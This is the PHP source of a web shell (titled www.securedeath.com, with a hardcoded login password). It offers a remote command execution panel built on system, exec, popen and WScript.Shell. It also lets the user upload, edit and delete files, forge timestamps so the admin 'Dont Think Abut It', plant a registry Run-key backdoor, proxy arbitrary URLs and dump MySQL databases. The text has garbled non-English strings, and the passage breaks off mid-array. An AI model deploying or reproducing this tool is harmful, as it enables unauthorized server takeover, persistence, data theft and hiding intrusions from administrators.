<?php

error_reporting(7);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];


$admin['check'] = "1";

$admin['pass']  = "fares1";


$onoff = (function_exists('ini_get')) ? ini_get('register_globals') : get_cfg_var('register_globals');

if ($onoff != 1) {
	@extract($_POST, EXTR_SKIP);
	@extract($_GET, EXTR_SKIP);
}

$self = $_SERVER['PHP_SELF'];
$dis_func = get_cfg_var("disable_functions");


if($admin['check'] == "1") {
	if ($_GET['action'] == "lo???ut") {
		setcookie ("adminpass", "");
		echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
		echo "<span style=\"font-size: 12px; font-family: Verdana\">Login Out<p><a href=\"".$self."\">If You Didnt Login Out Yet Press Her  &gt;&gt;&gt;</a></span>";
		exit;
	}

	if ($_POST['do'] == 'login') {
		$thepass=trim($_POST['adminpass']);
		if ($admin['pass'] == $thepass) {
			setcookie ("adminpass",$thepass,time()+(1*24*3600));
			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
			echo "<span style=\"font-size: 12px; font-family: Verdana\">Login in.....<p><a href=\"".$self."\">If You Didnt Enter Yet Press Her&gt;&gt;&gt;</a></span>";
			exit;
		}
	}
	if (isset($_COOKIE['adminpass'])) {
		if ($_COOKIE['adminpass'] != $admin['pass']) {
			loginpage();
		}
	} else {
		loginpage();
	}
}
if (get_magic_quotes_gpc()) {
    $_GET = stripslashes_array($_GET);
	$_POST = stripslashes_array($_POST);
}
if ($_GET['action'] == "phpinfo") {
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() ?¯E???±»½û??,Cë²é?´&lt;PHP»·¾³±???&gt;";
	exit;
}

if (isset($_POST['url'])) {
	$proxycontents = @file_get_contents($_POST['url']);
	echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>»?E? URL ??E?E§°U</b></p></center></body>";
	exit;
}

if (!empty($downfile)) {
	if (!@file_exists($downfile)) {
		echo "<script>alert('????IAµ?I?¼?²»´?O?!')</script>";
	} else {
		$filename = basename($downfile);
		$filename_info = explode('.', $filename);
		$fileext = $filename_info[count($filename_info)-1];
		header('Content-type: application/x-'.$fileext);
		header('Content-Disposition: attachment; filename='.$filename);
		header('Content-Description: PHP Generated Data');
		header('Content-Length: '.filesize($downfile));
		@readfile($downfile);
		exit;
	}
}

if ($_POST['backuptype'] == 'download') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("E?¾??â?¬½?E§°U");
	@mysql_select_db($dbname) or die("??O?E?¾??âE§°U");	
	$table = array_flip($_POST['table']);
	$result = mysql_query("SHOW tables");
	echo ($result) ? NULL : "³?´?: ".mysql_error();

	$filename = basename($_SERVER['HTTP_HOST']."_MySQL.sql");
	header('Content-type: application/unknown');
	header('Content-Disposition: attachment; filename='.$filename);
	$mysqldata = '';
	while ($currow = mysql_fetch_array($result)) {
		if (isset($table[$currow[0]])) {
			$mysqldata.= sqldumptable($currow[0]);
			$mysqldata.= $mysqldata."\r\n";
		}
	}
	mysql_close();
	exit;
}
$pathname=str_replace('\\','/',dirname(__FILE__)); 


if (!isset($dir) or empty($dir)) {
	$dir = ".";
	$nowpath = getPath($pathname, $dir);
} else {
	$dir=$_GET['dir'];
	$nowpath = getPath($pathname, $dir);
}


$dir_writeable = (dir_writeable($nowpath)) ? "" : "??? C????CE´";
$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO()</a>" : "";
$reg = (substr(PHP_OS, 0, 3) == 'WIN') ? " | <a href=\"?action=reg\">EC? I??</a>" : "";

$tb = new FORMS;

?>
<html>
<head>
<title>www.securedeath.com</title>
<meta http-equiv="Content-Language" content="ar-sa">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1256">
<meta name="GENERATOR" content="SiteMaker"><meta http-equiv="Content-Language" content="ar-sa">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1256">
<meta name="GENERATOR" content="SiteMaker">
<STYLE>
body,td {
	font-family: "Tahoma";
	font-size: "12px";
	line-height: "150%";
}
.smlfont {
	font-family: "Tahoma";
	font-size: "11px";
}
.INPUT {
	FONT-SIZE: "12px";
	COLOR: "#000000";
	BACKGROUND-COLOR: "#FFFFFF";
	height: "18px";
	border: "1px solid #666666";
	padding-left: "2px";
}
.redfont {
	COLOR: "#A60000";
}
a:link,a:visited,a:active {
	color: "#000000";
	text-decoration: underline;
}
a:hover {
	color: "#465584";
	text-decoration: none;
}
.top {BACKGROUND-COLOR: "#CCCCCC"}
.firstalt {BACKGROUND-COLOR: "#EFEFEF"}
.secondalt {BACKGROUND-COLOR: "#F5F5F5"}
</style>
<SCRIPT language=JavaScript>
function CheckAll(form) {
	for (var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
function really(d,f,m,t) {
	if (confirm(m)) {
		if (t == 1) {
			window.location.href='?dir='+d+'&deldir='+f;
		} else {
			window.location.href='?dir='+d+'&delfile='+f;
		}
	}
}
</SCRIPT>
</head>

<body style="table-layout:fixed; word-break:break-all">
<center>
<?php
$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>'.$_SERVER['HTTP_HOST'].'</b></td><td align="right"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');
$tb->tdbody('<a href="?action=lo???ut">E???? C?I???</a> | <a href="?action=dir">?U?C? C????CE</a> | <a href="?action=phpenv">?????CE ?? C??????</a> | <a href="?action=proxy">E?????</a>'.$reg.$phpinfo.' | <a href="?action=shell">?C??E C???C??</a> | <a href="?action=sql">??E??C?CE</a> | <a href="?action=sqlbak">?I? ??I? ?C?IE C?E?C?CE</a>');
$tb->tablefooter();
?>
<hr width="775" noshade>
<table width="775" border="0" cellpadding="0">
<?
$tb->headerform(array('method'=>'GET','content'=>'<p>??C?? ??? C??????: '.$pathname.'<br>??? ???? E????'.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>??OC? ???I ? C?II?? ????: '.$tb->makeinput('dir').' '.$tb->makeinput('','???','','submit').' '));

$tb->headerform(array('action'=>'?dir='.urlencode($dir),'enctype'=>'multipart/form-data','content'=>'??? ??? ??? C?????: '.$tb->makeinput('uploadfile','','','file').' '.$tb->makeinput('doupfile','???','','submit').$tb->makeinput('uploaddir',$dir,'','hidden')));

$tb->headerform(array('action'=>'?action=editfile&dir='.urlencode($dir),'content'=>'??OC? ???: '.$tb->makeinput('editfile').' '.$tb->makeinput('createfile','???','','submit')));

$tb->headerform(array('content'=>'??OC? ???I:'.$tb->makeinput('newdirectory').' '.$tb->makeinput('createdirectory','???','','submit')));
?>
</table>
<hr width="775" noshade>
<?php

echo "<p><b>\n";

if (!empty($delfile)) {
	if (file_exists($delfile)) {
		echo (@unlink($delfile)) ? $delfile." E¾³?³E¹¦!" : "I?¼?E¾³?E§°U!";
	} else {
		echo basename($delfile)." I?¼???²»´?O?!";
	}
}


elseif (!empty($deldir)) {
	$deldirs="$dir/$deldir";
	if (!file_exists("$deldirs")) {
		echo "$deldir ??A¼??²»´?O?!";
	} else {
		echo (deltree($deldirs)) ? "??A¼E¾³?³E¹¦!" : "??A¼E¾³?E§°U!";
	}
}


elseif (($createdirectory) AND !empty($_POST['newdirectory'])) {
	if (!empty($newdirectory)) {
		$mkdirs="$dir/$newdirectory";
		if (file_exists("$mkdirs")) {
			echo "¸???A¼??´?O?!";
		} else {
			echo (@mkdir("$mkdirs",0777)) ? "MoSt3mRE?E E???E ??C C?O? E?C??E " : "´´½¨E§°U!";
			@chmod("$mkdirs",0777);
		}
	}
}


elseif ($doupfile) {
	echo (@copy($_FILES['uploadfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadfile']['name']."")) ? "EI´«³E¹¦!" : "EI´«E§°U!";
}


elseif ($_POST['do'] == 'doeditfile') {
	if (!empty($_POST['editfilename'])) {
		$filename="$editfilename";
		@$fp=fopen("$filename","w");
		echo $msg=@fwrite($fp,$_POST['filecontent']) ? "?´EëI?¼?³E¹¦!" : "?´EëE§°U!";
		@fclose($fp);
	} else {
		echo "CëE?EëIë??±à¼­µ?I?¼??û!";
	}
}


elseif ($_POST['do'] == 'editfileperm') {
	if (!empty($_POST['fileperm'])) {
		$fileperm=base_convert($_POST['fileperm'],8,10);
		echo (@chmod($dir."/".$file,$fileperm)) ? "Eô?O??¸?³E¹¦!" : "??¸?E§°U!";
		echo " I?¼? ".$file." ??¸???µ?Eô?OI?: ".substr(base_convert(@fileperms($dir."/".$file),10,8),-4);
	} else {
		echo "CëE?EëIë??Eè??µ?Eô?O!";
	}
}


elseif ($_POST['do'] == 'rename') {
	if (!empty($_POST['newname'])) {
		$newname=$_POST['dir']."/".$_POST['newname'];
		if (@file_exists($newname)) {
			echo "".$_POST['newname']." ??¾­´?O?,Cë???AE?Eë?»¸?!";
		} else {
			echo (@rename($_POST['oldname'],$newname)) ? basename($_POST['oldname'])." ³E¹¦¸??ûI? ".$_POST['newname']." !" : "I?¼??û??¸?E§°U!";
		}
	} else {
		echo "CëE?EëIë??¸?µ?I?¼??û!";
	}
}


elseif ($_POST['do'] == 'domodtime') {
	if (!@file_exists($_POST['curfile'])) {
		echo "????¸?µ?I?¼?²»´?O?!";
	} else {
		if (!@file_exists($_POST['tarfile'])) {
			echo "??²I??µ?I?¼?²»´?O?!";
		} else {
			$time=@filemtime($_POST['tarfile']);
			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." µ???¸?E±¼?³E¹¦¸?I? ".date("Y-m-d H:i:s",$time)." !" : "I?¼?µ???¸?E±¼???¸?E§°U!";
		}
	}
}


elseif ($_POST['do'] == 'modmytime') {
	if (!@file_exists($_POST['curfile'])) {
		echo "????¸?µ?I?¼?²»´?O?!";
	} else {
		$year=$_POST['year'];
		$month=$_POST['month'];
		$data=$_POST['data'];		
		$hour=$_POST['hour'];
		$minute=$_POST['minute'];
		$second=$_POST['second'];
		if (!empty($year) AND !empty($month) AND !empty($data) AND !empty($hour) AND !empty($minute) AND !empty($second)) {
			$time=strtotime("$data $month $year $hour:$minute:$second");
			echo (@touch($_POST['curfile'],$time,$time)) ? basename($_POST['curfile'])." µ???¸?E±¼?³E¹¦¸?I? ".date("Y-m-d H:i:s",$time)." !" : "I?¼?µ???¸?E±¼???¸?E§°U!";
		}
	}
}

elseif ($connect) {
	if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {
		echo "E? C??E?C? E??C?";
		mysql_close();
	} else {
		echo mysql_error();
	}
}


elseif ($_POST['do'] == 'query') {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("E?¾??â?¬½?E§°U");
	@mysql_select_db($dbname) or die("??O?E?¾??âE§°U");
	$result = @mysql_query($_POST['sql_query']);
	echo ($result) ? "SQL?ï¾?³E¹¦?´??!" : "³?´?: ".mysql_error();
	mysql_close();
}

elseif ($_POST['do'] == 'backupmysql') {
	if (empty($_POST['table']) OR empty($_POST['backuptype'])) {
		echo "Cë??O??û±¸·?µ?E?¾?±???±¸·?·½E½!";
	} else {
		if ($_POST['backuptype'] == 'server') {
			@mysql_connect($servername,$dbusername,$dbpassword) or die("E?¾??â?¬½?E§°U");
			@mysql_select_db($dbname) or die("??O?E?¾??âE§°U");	
			$table = array_flip($_POST['table']);
			$filehandle = @fopen($path,"w");
			if ($filehandle) {
				$result = mysql_query("SHOW tables");
				echo ($result) ? NULL : "³?´?: ".mysql_error();
				while ($currow = mysql_fetch_array($result)) {
					if (isset($table[$currow[0]])) {
						sqldumptable($currow[0], $filehandle);
						fwrite($filehandle,"\n\n\n");
					}
				}
				fclose($filehandle);
				echo "E?¾??â??³E¹¦±¸·?µ½ <a href=\"".$path."\" target=\"_blank\">".$path."</a>";
				mysql_close();
			} else {
				echo "±¸·?E§°U,CëE·EI??±êI?¼?¼?EC·?¾????E?´E¨I?!";
			}
		}
	}
}


elseif($downrar) {
	if (!empty($dl)) {
		$dfiles="";
		foreach ($dl AS $filepath=>$value) {
			$dfiles.=$filepath.",";
		}
		$dfiles=substr($dfiles,0,strlen($dfiles)-1);
		$dl=explode(",",$dfiles);
		$zip=new PHPZip($dl);
		$code=$zip->out;		
		header("Content-type: application/octet-stream");
		header("Accept-Ranges: bytes");
		header("Accept-Length: ".strlen($code));
		header("Content-Disposition: attachment;filename=".$_SERVER['HTTP_HOST']."_Files.tar.gz");
		echo $code;
		exit;
	} else {
		echo "Cë??O???´?°üIAO?µ?I?¼?!";
	}
}

elseif(($_POST['do'] == 'programrun') AND !empty($_POST['program'])) {
	$shell= &new COM('Sh'.'el'.'l.Appl'.'ica'.'tion');
	$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);
	echo ($a=='0') ? "³?????¾­³E¹¦?´??!" : "³???OE??E§°U!";
}


elseif(($_POST['do'] == 'viewphpvar') AND !empty($_POST['phpvarname'])) {
	echo "????²IE? ".$_POST['phpvarname']." ¼?²â½?¹û: ".getphpcfg($_POST['phpvarname'])."";
}


elseif(($regread) AND !empty($_POST['readregname'])) {
	$shell= &new COM('WSc'.'rip'.'t.Sh'.'ell');
	var_dump(@$shell->RegRead($_POST['readregname']));
}


elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {
	$shell= &new COM('W'.'Scr'.'ipt.S'.'hell');
	$a = @$shell->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']);
	echo ($a=='0') ? "?´Eë×¢²?±?½??µ³E¹¦!" : "?´Eë ".$_POST['regname'].", ".$_POST['regval'].", ".$_POST['regtype']." E§°U!";
}


elseif(($regdelete) AND !empty($_POST['delregname'])) {
	$shell= &new COM('WS'.'cri'.'pt.S'.'he'.'ll');
	$a = @$shell->RegDelete($_POST['delregname']);
	echo ($a=='0') ? "E¾³?×¢²?±?½??µ³E¹¦!" : "E¾³? ".$_POST['delregname']." E§°U!";
}

else {
	echo "MoSt3mRE?E E???E ??C C?O? ??? C??UE C???E?E E?C??E ";
}

echo "</b></p>\n";

if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {
	$tb->tableheader();
?>
  <tr bgcolor="#cccccc">
    <td align="center" nowrap width="27%"><b>C????ICE ? C????CE</b></td>
	<td align="center" nowrap width="16%"><b>??E C???OC?</b></td>
    <td align="center" nowrap width="16%"><b>AI? E?I??</b></td>
    <td align="center" nowrap width="11%"><b>C????</b></td>
    <td align="center" nowrap width="6%"><b>C?E????</b></td>
    <td align="center" nowrap width="24%"><b>C????</b></td>
  </tr>
<?php

$dirs=@opendir($dir);
$dir_i = '0';
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="1"){
		if($file!=".." && $file!=".")	{
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
			$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);
			echo "<tr class=".getrowbg().">\n";
			echo "  <td style=\"padding-left: 5px;\">[<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\">&lt;dir&gt;</td>\n";
			echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$dirperm</a></td>\n";
			echo "  <td align=\"center\" nowrap><a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($file)."','?? ??E ?E??I ?? ??? ??C C????','1')\">???</a></td>\n";
			echo "</tr>\n";
			$dir_i++;
		} else {
			if($file=="..") {
				echo "<tr class=".getrowbg().">\n";
				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">up</a></td>\n";
				echo "</tr>\n";
			}
		}
	}
}// while
@closedir($dirs); 
?>
<tr bgcolor="#cccccc">
  <td colspan="6" height="5"></td>
</tr>
<FORM action="" method="POST">
<?

$dirs=@opendir($dir);
$file_i = '0';
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="0"){		
		$size=@filesize($filepath);
		$size=$size/1024 ;
		$size= @number_format($size, 3);
		if (@filectime($filepath) == @filemtime($filepath)) {
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
		} else {
			$ctime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filectime($filepath))."</span>";
			$mtime="<span class=\"redfont\">".@date("Y-m-d H:i:s",@filemtime($filepath))."</span>";
		}
		@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);
		echo "<tr class=".getrowbg().">\n";
		echo "  <td style=\"padding-left: 5px;\">";
		echo "<INPUT type=checkbox value=1 name=dl[$filepath]>";
		echo "<a href=\"$filepath\" target=\"_blank\">$file</a></td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\">$ctime</td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
		echo "  <td align=\"right\" nowrap class=\"smlfont\"><span class=\"redfont\">$size</span> KB</td>\n";
		echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$fileperm</a></td>\n";
		echo "  <td align=\"center\" nowrap><a href=\"?downfile=".urlencode($filepath)."\">E????</a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">E????</a> | <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($filepath)."','$file ?? ??E ?E??I ?? ???')\">????</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($filepath)."\">??CIE C?E???E</a> | <a href=\"?action=newtime&dir=".urlencode($dir)."&file=".urlencode($filepath)."\">E???? C???E</a></td>\n";
		echo "</tr>\n";
		$file_i++;
	}
}// while
@closedir($dirs); 
$tb->tdbody('<table width="100%" border="0" cellpadding="2" cellspacing="0" align="center"><tr><td>'.$tb->makeinput('chkall','on','onclick="CheckAll(this.form)"','checkbox','30','').' '.$tb->makeinput('downrar','?I? ??I?','','submit').'</td><td align="right">'.$dir_i.' Dir / '.$file_i.' File?</td></tr></table>','center',getrowbg(),'','','6');

echo "</FORM>\n";
echo "</table>\n";
}// end dir

elseif ($_GET['action'] == "editfile") {
	if(empty($newfile)) {
		$filename="$dir/$editfile";
		$fp=@fopen($filename,"r");
		$contents=@fread($fp, filesize($filename));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}else{
		$editfile=$newfile;
		$filename = "$dir/$editfile";
	}
	$action = "?dir=".urlencode($dir)."&editfile=".$editfile;
	$tb->tableheader();
	$tb->formheader($action,'Edit File?');
	$tb->tdbody('The File You Want To Edit?: '.$tb->makeinput('editfilename',$filename).' Be Happy?');
	$tb->tdbody($tb->maketextarea('filecontent',$contents));
	$tb->makehidden('do','doeditfile');
	$tb->formfooter('1','30');
}//end editfile

elseif ($_GET['action'] == "rename") {
	$nowfile = (isset($_POST['newname'])) ? $_POST['newname'] : basename($_GET['fname']);
	$action = "?dir=".urlencode($dir)."&fname=".urlencode($fname);
	$tb->tableheader();
	$tb->formheader($action,'Rename File');
	$tb->makehidden('oldname',$dir."/".$nowfile);
	$tb->makehidden('dir',$dir);
	$tb->tdbody('Baset Name: '.basename($nowfile));
	$tb->tdbody('New Name: '.$tb->makeinput('newname'));
	$tb->makehidden('do','rename');
	$tb->formfooter('1','30');
}//end rename

elseif ($_GET['action'] == "fileperm") {
	$action = "?dir=".urlencode($dir)."&file=".$file;
	$tb->tableheader();
	$tb->formheader($action,'?Chembo File');
	$tb->tdbody('Chang Chembo Of This To: '.$tb->makeinput('fileperm',substr(base_convert(fileperms($dir.'/'.$file),10,8),-4)));
	$tb->makehidden('file',$file);
	$tb->makehidden('dir',urlencode($dir));
	$tb->makehidden('do','editfileperm');
	$tb->formfooter('1','30');
}//end fileperm

elseif ($_GET['action'] == "newtime") {
	$action = "?dir=".urlencode($dir);
	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
	$tb->tableheader();
	$tb->formheader($action,'Chang File');
	$tb->tdbody("From?: ".$tb->makeinput('curfile',$file,'readonly')." To: ".$tb->makeinput('tarfile','?è?î?ê?ûA·¾¶¼°I?¼??û'),'center','2','30');
	$tb->makehidden('do','domodtime');
	$tb->formfooter('','30');
	$tb->formheader($action,'Chang Time');
	$tb->tdbody('<br><ul><li>You Can Chang The Time Of Any File You Want Whith</li><li>You Can Chang The Time Of Any File To Let The Admin Dont Think Abut It</li></ul>','left');
	$tb->tdbody('The File Is: '.$file);
	$tb->makehidden('curfile',$file);
	$tb->tdbody('Year: '.$tb->makeinput('year','1984','','text','4').' Month'.$tb->makeselect(array('name'=>'month','option'=>$cachemonth,'selected'=>'October')).'Day '.$tb->makeinput('data','18','','text','2').' hour '.$tb->makeinput('hour','20','','text','2').' minute '.$tb->makeinput('minute','00','','text','2').' second '.$tb->makeinput('second','00','','text','2').' ','center','2','30');
	$tb->makehidden('do','modmytime');
	$tb->formfooter('1','30');
}//end newtime

elseif ($_GET['action'] == "shell") {
	$action = "??action=shell&dir=".urlencode($dir);
	$tb->tableheader();
	$tb->tdheader('WebShell Mode');

	if (substr(PHP_OS, 0, 3) == 'WIN') {
		$program = isset($_POST['program']) ? $_POST['program'] : "c:\winnt\system32\cmd.exe";
		$prog = isset($_POST['prog']) ? $_POST['prog'] : "/c net start > ".$pathname."/log.txt";
		echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
		$tb->tdbody('The Program That Make Comand'.$tb->makeinput('program',$program).' To See Log '.$tb->makeinput('prog',$prog,'','text','40').' '.$tb->makeinput('','Run','','submit'),'center','2','35');
		$tb->makehidden('do','programrun');
		echo "</form>\n";
	}

	echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
	$tb->tdbody('Her You Can Do Any Comand To The Searver.');
	
	$execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen');

	$tb->tdbody('The Mode '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' The Comand'.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));
?>
  <tr class="secondalt">
    <td align="center"><textarea name="textarea" cols="100" rows="25" readonly><?php
	if (!empty($_POST['command'])) {
		if ($execfunc=="system") {
			system($_POST['command']);
		} elseif ($execfunc=="passthru") {
			passthru($_POST['command']);
		} elseif ($execfunc=="exec") {
			$result = exec($_POST['command']);
			echo $result;
		} elseif ($execfunc=="shell_exec") {
			$result=shell_exec($_POST['command']);
			echo $result;	
		} elseif ($execfunc=="popen") {
			$pp = popen($_POST['command'], 'r');
			$read = fread($pp, 2096);
			echo $read;
			pclose($pp);
		} elseif ($execfunc=="wscript") {
			$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die("PHP Create COM WSHSHELL failed");
			$exec = $wsh->exec ("cm"."d.e"."xe /c ".$_POST['command']."");
			$stdout = $exec->StdOut();
			$stroutput = $stdout->ReadAll();
			echo $stroutput;
		} else {
			system($_POST['command']);
		}
	}
	?></textarea></td>
  </tr>  
  </form>
</table>
<?php
}//end shell

elseif ($_GET['action'] == "reg") {
	$action = '?action=reg';
	$regname = isset($_POST['regname']) ? $_POST['regname'] : 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp\PortNumber';
	$registre = isset($_POST['registre']) ? $_POST['registre'] : 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Backdoor';
	$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\winnt\backdoor.exe';
	$delregname = $_POST['delregname'];
	$tb->tableheader();
	$tb->formheader($action,'?E? ????');
	$tb->tdbody('C????: '.$tb->makeinput('readregname',$regname,'','text','100').' '.$tb->makeinput('regread','???','','submit'),'center','2','50');
	echo "</form>";

	$tb->formheader($action,'EC?I??');
	$cacheregtype = array('REG_SZ'=>'REG_SZ','REG_BINARY'=>'REG_BINARY','REG_DWORD'=>'REG_DWORD','REG_MULTI_SZ'=>'REG_MULTI_SZ','REG_EXPAND_SZ'=>'REG_EXPAND_SZ');
	$tb->tdbody('C????: '.$tb->makeinput('writeregname',$registre,'','text','56').' Selct Taype: '.$tb->makeselect(array('name'=>'regtype','option'=>$cacheregtype,'selected'=>$regtype)).' C???C?:  '.$tb->makeinput('regval',$regval,'','text','15').' '.$tb->makeinput('regwrite','???','','submit'),'center','2','50');
	echo "</form>";

	$tb->formheader($action,'???');
	$tb->tdbody('C????: '.$tb->makeinput('delregname',$delregname,'','text','100').' '.$tb->makeinput('regdelete','???','','submit'),'center','2','50');
	echo "</form>";
	$tb->tablefooter();
}//end reg

elseif ($_GET['action'] == "proxy") {
	$action = '?action=proxy';
	$tb->tableheader();
	$tb->formheader($action,'E?????','proxyframe');
	$tb->tdbody('<br><ul><li>E?E??? E??EE ? ??EIIC? ??C C?E?????</li><li>MoSt3mRE???E ?E???? </li><li> '.$_SERVER['REMOTE_ADDR'].'</li></ul>','left');
	$tb->tdbody('URL: '.$tb->makeinput('url','http://www.hackers-world.net','','text','100').' '.$tb->makeinput('','???','','submit'),'center','1','40');
	$tb->tdbody('<iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="http://www.4ngel.net"></iframe>');
	echo "</form>";
	$tb->tablefooter();
}//end proxy

elseif ($_GET['action'] == "sql") {
	$action = '?action=sql';
	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
	$dbpassword = $_POST['dbpassword'];
	$dbname = $_POST['dbname'];
	$sql_query = $_POST['sql_query'];
	$tb->tableheader();
	$tb->formheader($action,'SQL QUERY');
	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','Connect','','submit'));
	$tb->tdbody($tb->maketextarea('sql_query',$sql_query,'85','10'));
	$tb->makehidden('do','query');
	$tb->formfooter('1','30');
}//end sql query

elseif ($_GET['action'] == "sqlbak") {
	$action = '?action=sqlbak';
	$servername = isset($_POST['servername']) ? $_POST['servername'] : 'localhost';
	$dbusername = isset($_POST['dbusername']) ? $_POST['dbusername'] : 'root';
	$dbpassword = $_POST['dbpassword'];
	$dbname = $_POST['dbname'];
	$tb->tableheader();
	$tb->formheader($action,'?I? ??I? ?? ?C?IE C?E?C?CE');
	$tb->tdbody('Host: '.$tb->makeinput('servername',$servername,'','text','20').' User: '.$tb->makeinput('dbusername',$dbusername,'','text','15').' Pass: '.$tb->makeinput('dbpassword',$dbpassword,'','text','15').' DB: '.$tb->makeinput('dbname',$dbname,'','text','15').' '.$tb->makeinput('connect','?E??','','submit'));
	@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname);
    $tables = @mysql_list_tables($dbname);
    while ($table = @mysql_fetch_row($tables)) {
		$cachetables[$table[0]] = $table[0];
    }
    @mysql_free_result($tables);
	if (empty($cachetables)) {
		$tb->tdbody('<b></b>');
	} else {
		$tb->tdbody('<table border="0" cellpadding="3" cellspacing="1"><tr><td valign="top">?C??E C??IC??:</td><td>'.$tb->makeselect(array('name'=>'table[]','option'=>$cachetables,'multiple'=>1,'size'=>15,'css'=>1)).'</td></tr><tr nowrap><td><input type="radio" name="backuptype" value="server" checked> ??? E??I ?? EI?? C???I? ?? C??C?IE:</td><td>'.$tb->makeinput('path',$pathname.'/'.$_SERVER['HTTP_HOST'].'_MySQL.sql','','text','50').'</td></tr><tr nowrap><td colspan="2"><input type="radio" name="backuptype" value="download"> ??U C???I? ?? C??C?IE ??? C???C?</td></tr></table>');
		$tb->makehidden('do','backupmysql');
		$tb->formfooter('0','30');
	}
	$tb->tablefooter();
	@mysql_close();
}//end sql backup

elseif ($_GET['action'] == "phpenv") {
	$upsize=get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "²»OE??EI´«";
	$adminmail=(isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
	if ($dis_func == "") {
		$dis_func = "No";
	}else {
		$dis_func = str_replace(" ","<br>",$dis_func);
		$dis_func = str_replace(",","<br>",$dis_func);
	}
	$phpinfo=(!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
		$info = array(
			0  => array("??E ??OC? C??????",date("Y?êmOAdE? h:i:s",time())),
